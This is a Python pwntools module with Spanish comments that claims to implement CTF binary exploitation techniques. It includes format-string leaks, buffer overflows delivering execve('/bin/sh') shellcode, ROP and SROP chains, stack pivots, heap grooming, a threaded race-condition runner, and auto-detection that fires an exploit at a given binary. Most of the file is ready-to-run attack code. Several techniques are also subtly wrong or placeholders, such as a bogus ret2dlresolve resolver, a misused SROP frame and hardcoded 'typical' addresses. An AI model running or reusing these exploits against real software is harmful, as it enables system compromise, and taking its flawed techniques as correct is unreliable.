#!/usr/bin/env python3
"""
Técnicas Avanzadas de MindCrafters para PWN AI Analyzer
Implementación de técnicas específicas extraídas de writeups reales
"""

import os
import sys
import re
import time
import threading
import subprocess
from pwn import *

class MindCraftersTechniques:
    def __init__(self):
        self.context_setup()
        self.techniques_implemented = [
            "utf8_byte_bypass",
            "format_string_leak_and_exploit", 
            "custom_shellcode_injection",
            "stack_pivot_techniques",
            "multi_stage_exploitation",
            "python_character_vs_byte_bypass",
            "advanced_rop_chaining",
            "heap_feng_shui",
            "ret2dlresolve",
            "sigrop_exploitation"
        ]
    
    def context_setup(self):
        """Configuración de contexto optimizada"""
        context.update(arch='x86_64', os='linux')
        context.log_level = 'warning'
        context.terminal = ['wt.exe', 'wsl.exe']
    
    def utf8_byte_bypass_technique(self, target_binary, max_chars=255):
        """
        Técnica de bypass UTF-8: Safe Gets Challenge
        Explota la diferencia entre caracteres y bytes en Python
        """
        print("[+] Implementando técnica UTF-8 Byte Bypass...")
        
        try:
            p = process(target_binary)
            
            # Carácter UTF-8 que ocupa 3 bytes pero cuenta como 1 carácter
            t_in_circle_utf8 = "ⓣ".encode("utf-8")  # 3 bytes por carácter
            
            # Calcular cuántos caracteres UTF-8 podemos usar
            utf8_chars = max_chars // 3
            remaining_bytes = max_chars - (utf8_chars * 3)
            
            # Construir payload que excede el límite de bytes pero no de caracteres
            payload = t_in_circle_utf8 * utf8_chars
            payload += b'\x00' * remaining_bytes
            
            # Agregar dirección de retorno (ajustar según binario)
            if hasattr(context.binary, 'sym') and 'win' in context.binary.sym:
                win_addr = context.binary.sym.win
                payload += p64(win_addr + 5)  # +5 para saltar prólogo
            
            print(f"[+] Payload UTF-8: {len(payload)} bytes, {utf8_chars} caracteres")
            return payload
            
        except Exception as e:
            print(f"[-] Error en UTF-8 bypass: {e}")
            return None
    
    def format_string_leak_and_exploit(self, target_binary):
        """
        Técnica de Format String con leak y explotación
        Basada en "The Goose" challenge
        """
        print("[+] Implementando Format String Leak & Exploit...")
        
        try:
            p = process(target_binary)
            
            # Fase 1: Leak de dirección del stack
            format_payload = f"%{1}$p".encode()
            p.sendlineafter(b"what's your name again?", format_payload)
            
            recv = p.recv()
            match = re.search(rb'0x[0-9a-fA-F]+', recv)
            
            if match:
                leaked_addr = int(match.group(0), 16)
                print(f"[+] Dirección leakeada: {hex(leaked_addr)}")
                
                # Fase 2: Calcular dirección de shellcode
                shellcode_addr = leaked_addr + 0x52 + 8  # Offset específico
                
                # Fase 3: Inyectar shellcode personalizado
                shellcode = self.generate_custom_shellcode()
                
                # Fase 4: Buffer overflow con dirección calculada
                overflow_payload = b'A' * 72  # Offset hasta RIP
                overflow_payload += p64(shellcode_addr)
                overflow_payload += shellcode
                
                return overflow_payload
            
        except Exception as e:
            print(f"[-] Error en format string exploit: {e}")
            return None
    
    def generate_custom_shellcode(self):
        """
        Generar shellcode personalizado optimizado
        """
        print("[+] Generando shellcode personalizado...")
        
        # Shellcode para execve("/bin/sh", NULL, NULL)
        shellcode = asm("""
            xor rax, rax
            push rax
            mov rbx, 0x68732f2f6e69622f
            push rbx
            mov rdi, rsp
            push rax
            push rdi
            mov rsi, rsp
            mov rdx, rax
            mov rax, 59
            syscall
        """)
        
        print(f"[+] Shellcode generado: {len(shellcode)} bytes")
        return shellcode
    
    def stack_pivot_technique(self, target_binary, pivot_gadget_addr):
        """
        Técnica de Stack Pivot para ROP avanzado
        """
        print("[+] Implementando Stack Pivot...")
        
        try:
            # Buscar gadgets de stack pivot
            pivot_gadgets = [
                "pop rsp; ret",
                "xchg rsp, rax; ret", 
                "mov rsp, rbp; ret",
                "add rsp, 0x??; ret"
            ]
            
            # Crear nueva stack en área controlada
            fake_stack_addr = 0x7fffffffe000  # Dirección típica de stack
            
            # Payload con stack pivot
            payload = b'A' * 72  # Overflow hasta RIP
            payload += p64(pivot_gadget_addr)  # Gadget de pivot
            payload += p64(fake_stack_addr)    # Nueva dirección de stack
            
            return payload
            
        except Exception as e:
            print(f"[-] Error en stack pivot: {e}")
            return None
    
    def multi_stage_exploitation(self, target_binary):
        """
        Explotación multi-etapa como en writeups complejos
        """
        print("[+] Implementando explotación multi-etapa...")
        
        stages = {
            "stage1": "Information leak",
            "stage2": "Address calculation", 
            "stage3": "Payload delivery",
            "stage4": "Privilege escalation"
        }
        
        try:
            p = process(target_binary)
            results = {}
            
            # Etapa 1: Leak de información
            leak_payload = b"%p " * 20
            p.sendline(leak_payload)
            leak_data = p.recvline()
            results["leaks"] = self.parse_format_string_leaks(leak_data)
            
            # Etapa 2: Cálculo de direcciones
            if results["leaks"]:
                base_addr = results["leaks"][0] - 0x1000  # Ajustar según binario
                results["calculated_addrs"] = {
                    "libc_base": base_addr,
                    "system_addr": base_addr + 0x50d70,  # Offset típico
                    "binsh_addr": base_addr + 0x1d8698   # Offset típico
                }
            
            # Etapa 3: Construcción de ROP chain
            rop_chain = self.build_advanced_rop_chain(results["calculated_addrs"])
            
            # Etapa 4: Entrega final del payload
            final_payload = b'A' * 72 + rop_chain
            p.sendline(final_payload)
            
            return results
            
        except Exception as e:
            print(f"[-] Error en explotación multi-etapa: {e}")
            return None
    
    def parse_format_string_leaks(self, leak_data):
        """
        Parsear leaks de format string
        """
        addresses = []
        matches = re.findall(rb'0x[0-9a-fA-F]+', leak_data)
        
        for match in matches:
            try:
                addr = int(match, 16)
                if addr > 0x400000:  # Filtrar direcciones válidas
                    addresses.append(addr)
            except:
                continue
        
        return addresses
    
    def build_advanced_rop_chain(self, addresses):
        """
        Construir ROP chain avanzado
        """
        if not addresses:
            return b""
        
        # ROP chain típico: ret2system
        rop_chain = b""
        
        if "system_addr" in addresses and "binsh_addr" in addresses:
            # pop rdi; ret (buscar en binario)
            pop_rdi = 0x400743  # Dirección típica, ajustar según binario
            
            rop_chain += p64(pop_rdi)
            rop_chain += p64(addresses["binsh_addr"])
            rop_chain += p64(addresses["system_addr"])
        
        return rop_chain
    
    def heap_feng_shui_technique(self, target_binary):
        """
        Técnica de Heap Feng Shui para manipulación de heap
        """
        print("[+] Implementando Heap Feng Shui...")
        
        try:
            p = process(target_binary)
            
            # Fase 1: Preparar heap layout
            chunk_sizes = [0x20, 0x30, 0x40, 0x50]
            allocated_chunks = []
            
            for size in chunk_sizes:
                # Simular malloc con tamaño específico
                payload = b'A' * (size - 8)  # -8 para metadata
                p.sendline(payload)
                allocated_chunks.append(size)
            
            # Fase 2: Crear fragmentación controlada
            for i in range(0, len(allocated_chunks), 2):
                # Liberar chunks alternados
                free_payload = f"free {i}".encode()
                p.sendline(free_payload)
            
            # Fase 3: Explotar fragmentación
            exploit_payload = b'A' * 0x18  # Tamaño específico
            exploit_payload += p64(0x41)   # Fake chunk size
            exploit_payload += p64(0x602060)  # Target address
            
            p.sendline(exploit_payload)
            
            return True
            
        except Exception as e:
            print(f"[-] Error en heap feng shui: {e}")
            return False
    
    def ret2dlresolve_technique(self, target_binary):
        """
        Técnica ret2dlresolve para bypass de ASLR
        """
        print("[+] Implementando ret2dlresolve...")
        
        try:
            binary = ELF(target_binary)
            
            # Buscar secciones necesarias
            plt_section = binary.get_section_by_name('.plt')
            got_section = binary.get_section_by_name('.got.plt')
            
            if not plt_section or not got_section:
                print("[-] Secciones PLT/GOT no encontradas")
                return None
            
            # Construir payload ret2dlresolve
            dlresolve_payload = b'A' * 72  # Overflow
            
            # Dirección de _dl_runtime_resolve
            dl_resolve = binary.plt['__libc_start_main'] + 6
            
            # Índice de relocation (ajustar según binario)
            reloc_index = 0x0
            
            dlresolve_payload += p64(dl_resolve)
            dlresolve_payload += p64(reloc_index)
            
            return dlresolve_payload
            
        except Exception as e:
            print(f"[-] Error en ret2dlresolve: {e}")
            return None
    
    def sigrop_exploitation_technique(self, target_binary):
        """
        Técnica SIGROP (Signal Return Oriented Programming)
        """
        print("[+] Implementando SIGROP...")
        
        try:
            # Crear frame de signal falso
            frame = SigreturnFrame()
            frame.rax = 59  # sys_execve
            frame.rdi = 0x602000  # "/bin/sh" address
            frame.rsi = 0
            frame.rdx = 0
            frame.rip = 0x400000  # syscall address
            
            # Payload SIGROP
            sigrop_payload = b'A' * 72
            sigrop_payload += p64(0x400517)  # syscall; ret gadget
            sigrop_payload += bytes(frame)
            
            return sigrop_payload
            
        except Exception as e:
            print(f"[-] Error en SIGROP: {e}")
            return None
    
    def advanced_race_condition_exploit(self, target_binary, num_threads=100):
        """
        Explotación avanzada de race conditions con timing preciso
        """
        print(f"[+] Implementando race condition con {num_threads} threads...")
        
        class RaceExploiter:
            def __init__(self):
                self.success = False
                self.result = None
                self.lock = threading.Lock()
            
            def worker_thread(self, thread_id):
                try:
                    p = process(target_binary)
                    
                    # Timing crítico específico
                    time.sleep(0.0001 * thread_id)
                    
                    # Payload específico para race condition
                    race_payload = f"thread_{thread_id}_exploit".encode()
                    p.sendline(race_payload)
                    
                    response = p.recvall(timeout=1)
                    
                    with self.lock:
                        if b"flag" in response.lower() or b"success" in response.lower():
                            self.success = True
                            self.result = response
                            print(f"[!] Race condition exitosa en thread {thread_id}")
                    
                    p.close()
                    
                except Exception as e:
                    pass  # Silenciar errores de threads individuales
        
        exploiter = RaceExploiter()
        threads = []
        
        # Lanzar threads concurrentes
        for i in range(num_threads):
            t = threading.Thread(target=exploiter.worker_thread, args=(i,))
            threads.append(t)
            t.start()
        
        # Esperar resultados
        for t in threads:
            t.join()
        
        return exploiter.success, exploiter.result
    
    def detect_and_exploit_challenge(self, target_file):
        """
        Detectar automáticamente el tipo de desafío y aplicar técnica apropiada
        """
        print(f"[+] Analizando desafío: {target_file}")
        
        # Análisis estático básico
        try:
            with open(target_file, 'rb') as f:
                binary_data = f.read(1000)  # Primeros 1000 bytes
            
            # Detectar patrones específicos
            patterns = {
                "utf8_bypass": [b"max", b"255", b"bytes", b"character"],
                "format_string": [b"printf", b"sprintf", b"%s", b"%d"],
                "heap_exploit": [b"malloc", b"free", b"chunk"],
                "rop_chain": [b"system", b"/bin/sh", b"execve"],
                "race_condition": [b"thread", b"pthread", b"concurrent"]
            }
            
            detected_techniques = []
            
            for technique, pattern_list in patterns.items():
                for pattern in pattern_list:
                    if pattern in binary_data:
                        detected_techniques.append(technique)
                        break
            
            print(f"[+] Técnicas detectadas: {detected_techniques}")
            
            # Aplicar técnica más apropiada
            if "utf8_bypass" in detected_techniques:
                return self.utf8_byte_bypass_technique(target_file)
            elif "format_string" in detected_techniques:
                return self.format_string_leak_and_exploit(target_file)
            elif "heap_exploit" in detected_techniques:
                return self.heap_feng_shui_technique(target_file)
            elif "race_condition" in detected_techniques:
                return self.advanced_race_condition_exploit(target_file)
            else:
                return self.multi_stage_exploitation(target_file)
                
        except Exception as e:
            print(f"[-] Error en detección automática: {e}")
            return None

def main():
    """Función principal para testing"""
    print("🎯 MINDCRAFTERS TECHNIQUES - Testing Suite")
    print("="*50)
    
    techniques = MindCraftersTechniques()
    
    # Mostrar técnicas implementadas
    print("\n[+] Técnicas implementadas:")
    for i, technique in enumerate(techniques.techniques_implemented, 1):
        print(f"  {i}. {technique}")
    
    # Test con binario de ejemplo
    if len(sys.argv) > 1:
        target_binary = sys.argv[1]
        print(f"\n[+] Testing con binario: {target_binary}")
        
        result = techniques.detect_and_exploit_challenge(target_binary)
        
        if result:
            print(f"[+] Explotación exitosa!")
        else:
            print(f"[-] Explotación falló")
    else:
        print("\n[+] Uso: python mindcrafters_techniques.py <binary>")

if __name__ == "__main__":
    main()